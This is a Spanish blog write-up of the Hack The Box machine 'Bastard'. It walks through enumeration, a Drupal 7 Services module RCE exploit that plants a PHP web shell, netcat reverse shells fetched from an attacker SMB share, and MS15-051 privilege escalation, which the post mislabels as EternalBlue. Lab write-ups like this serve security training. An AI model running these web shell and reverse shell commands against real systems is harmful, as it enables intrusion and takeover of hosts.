---
layout: post
title: Bastard
date: 2022-11-17
categories: ["HTB", "Enumeration", "Drupal", "RCE", "EternalBlue"]
thumbnail: "assets/images/Bastard.png"
---

# Bastard [ Hack The Box ]

### Reconocimiento

#### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 10.10.10.9 -oG allPorts`
- `nmap -sCV -p80,135 10.10.10.9 -oN targeted`

`NMAP` nos dice la versión de `Drupal`, en este caso `7`.

### Inspección

Vemos que `NMAP` (además de la versión de `Drupal`) nos dice que el archivo `robots.txt` existe, así que vamos a verlo y vemos un `TXT` llamado `CHANGELOG.txt`, al abrirlo podemos ver (como su nombre indica) los cambios realizados a `Drupal`, vemos que la versión que tienen instalada es la `7.54`, lanzada día uno de febrero del 2017.

```
Drupal 7.54, 2017-02-01
-----------------------

- Modules are now able to define theme engines (API addition:
https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
(API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served
```

Con SearchSploit buscamos por `Drupal` y nos aparecen muchos `exploits`, pero vemos uno que sirve para todas las versiones de `Drupal 7`, por lo que usaremos ese.

```
Drupal 7.x Module Services - Remote Code Execution | exploits/php/webapps/41564.php
```

Para poder copiarlo en el directorio en el que estamos usaremos el parámetro `-m` y especificaremos la ruta, en este caso: `exploits/php/webapps/41564.php`

- `searchsploit -m exploits/php/webapps/41564.php`

Vemos que el `script` requiere de dos cosas, la `URL` y la ruta `endpoint`, para obtener la ruta usaremos [`DirSearch`](https://github.com/maurosoria/dirsearch), una herramienta que nos ayudará a encontrar directorios y archivos. Lo bueno de [`DirSearch`](https://github.com/maurosoria/dirsearch) es que ya tiene implementado un diccionario propio con las rutas y archivos más importantes y comunes.

Con esto claro procederemos a ejecutar la herramienta, el parámetro `-e` es para especificar la extensión, en este caso `PHP` aunque también encontrará rutas. El parámetro `-x` es para excluir códigos de estado y, por último, el parámetro `-t`, que sirve para especificar la cantidad de hilos a utilizar.

```
dirsearch.py -u "http://10.10.10.9/" -e php -x 403,404 -t 50
```

```
_|. _ _ _ _ _ _|_ v0.3.
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 50 | Wordlist size: 5963

Error Log: /opt/dirsearch/logs/errors-19-03-07_11-06-02.log

Target: http://10.10.10.9/

[...]
[12:02:32] 200 - 2KB - /robots.txt
[12:02:37] 200 - 62B - /rest/
[...]

Task Completed
```

Como vemos hemos encontrado una ruta con el nombre `rest`, la cual si le enviamos una petición nos sale lo siguiente:

```
Services Endpoint "rest_endpoint" has been setup successfully.
```

Bien! Ya tenemos todos los requisitos para poder explotarlo! Aunque antes tenemos que cambiar algunos parámetros del archivo `PHP` antes descargado.

```
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
'filename' => 'black.php',
'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

Vemos que el parámetro `data` es algo extraño, lo puse así para una vez creado el archivo `PHP` pasarle (con el parámetro `cmd`) el comando para ejecutarlo a nivel de sistema.

Bien! Ahora podemos ejecutar el archivo con `php` para que nuestro archivo malicioso se suba.

- `php 41564.php`

```
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce

#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/black.php
```

- `curl http://10.10.10.9/black.php?cmd=whoami`

```
nt authority\iusr
```

### Shell

Bien! Ahora que ya podemos ejecutar comandos a nivel de sistema de una forma más cómoda podemos utilizar [`smbserver.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) del repositorio [`Impacket`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) para subir el `EXE` de `NC` y así poder entablarnos una conexión, ya que si tratamos de mandar una petición normal no nos dejará.

- `smbserver.py black .`
- `rlwrap -cAr nc -nlvp 4444`

Una vez hayamos creado el servidor `SMB` y habernos puesto en escucha por el puerto que nosotros queramos podemos visitar la siguiente `URL`:

```
http://10.10.10.9/black.php?cmd=\\10.10.14.15\black\nc64.exe -e cmd.exe 10.10.14.9 4444
```
Bien! Ya estamos dentro de la máquina como `IUSR`!

### Subida de privilegios

Estupendo, ya estamos en la máquina, pero queremos ser administradores, así que comencé por enumerar el sistema con `systeminfo` y me fijé que era `Windows Server 2008`, por lo que estaba bastante desactualizado.

Tras hacer una pequeña búsqueda encontré que era vulnerable a `EternalBlue`, así que para explotarlo me descargué un ZIP del repositorio [`Windows Kernel Exploit`](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051), el cual contenía un archivo `EXE` llamado `ms15-051x64.exe`.

Antes de nada me gustaría probar si funciona, así que me montaré el servidor de nuevo.

- `smbserver.py black .`

```
PS C:\inetpub\drupal-7.54> \\10.10.14.15\black\ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 3012 created.
==============================
nt authority\system
```

Funciona! De nuevo utilizaré el servidor `SMB` para transferir el archivo a la máquina víctima y, con `NC`, entablarnos una Reverse Shell. Por lo que nos ponemos en escucha por el puerto que queramos con `NC`.

- `rlwrap -cAr nc -nlvp 443`

```
C:\inetpub\drupal-7.54>\\10.10.14.15\black\ms15-051x64.exe
"\\10.10.14.15\black\nc64.exe -e cmd.exe 10.10.14.15 443"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1612 created.
==============================
```
Enhorabuena! Hemos recibido la Reverse Shell y ya somos administradores de la máquina!
